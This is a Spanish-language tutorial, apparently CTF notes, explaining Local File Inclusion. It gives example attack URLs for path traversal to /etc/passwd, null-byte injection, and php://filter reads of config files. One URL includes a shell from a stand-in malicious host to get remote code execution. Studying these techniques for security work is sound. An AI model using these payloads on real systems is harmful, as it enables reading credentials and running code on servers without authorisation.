## Inclusión de Archivos Locales (LFI)

La vulnerabilidad de Inclusión de Archivos Locales (LFI) es una vulnerabilidad de seguridad informática que se produce cuando una aplicación web no valida adecuadamente las entradas de usuario, permitiendo a un atacante acceder a archivos locales en el servidor web.

En muchos casos, los atacantes aprovechan la vulnerabilidad de LFI al abusar de parámetros de entrada en la aplicación web. Los parámetros de entrada son datos que los usuarios ingresan en la aplicación web, como las URL o los campos de formulario. Los atacantes pueden manipular los parámetros de entrada para incluir rutas de archivo local en la solicitud, lo que puede permitirles acceder a archivos en el servidor web. Esta técnica se conoce como "Path Traversal" y se utiliza comúnmente en ataques de LFI.

En el ataque de Path Traversal, el atacante utiliza caracteres especiales y caracteres de escape en los parámetros de entrada para navegar a través de los directorios del servidor web y acceder a archivos en ubicaciones sensibles del sistema.

Por ejemplo, el atacante podría incluir "../" en el parámetro de entrada para navegar hacia arriba en la estructura del directorio y acceder a archivos en ubicaciones sensibles del sistema.

### Ejemplos básicos de LFI

#### Path Traversal básico
```ruby
http://sitio-vulnerable.com/index.php?page=../../../etc/passwd
```
Este ejemplo intenta acceder al archivo `/etc/passwd` en un sistema basado en Unix.

#### Inyección de byte nulo
```ruby
http://sitio-vulnerable.com/index.php?page=../../../etc/passwd%00
```
Esta técnica puede ser utilizada para eludir ciertos tipos de validación de entrada.

### Ejemplos avanzados de LFI

#### Uso de wrapper de PHP
```ruby
http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=config.php
```
Este ejemplo utiliza un envoltorio de PHP para leer y codificar el contenido de un archivo PHP.

#### Inclusión remota mediante LFI combinado con RFI
```ruby
http://sitio-vulnerable.com/index.php?page=http://servidor-malicioso.com/shell.txt
```
Si la configuración `allow_url_include` está habilitada, esto puede permitir la ejecución de código remoto.

#### Abuso de cadenas de filtros en PHP
```ruby
http://sitio-vulnerable.com/index.php?page=php://filter/convert.base64-encode/resource=../../../../var/www/html/index.php
```
Esto permite al atacante leer archivos sensibles codificados en Base64.


### Herramientas útiles

- **PHP Filter Chain Generator**: Herramienta para generar cadenas de filtros en PHP y abusar de ellas para conseguir ejecución remota de comandos. [Enlace a la herramienta](https://github.com/synacktiv/php_filter_chain_generator)

### Recursos adicionales para CTF

- **Payloads All The Things**: Repositorio con ejemplos de payloads para LFI y otras vulnerabilidades. [Enlace al repositorio](https://github.com/swisskyrepo/PayloadsAllTheThings)
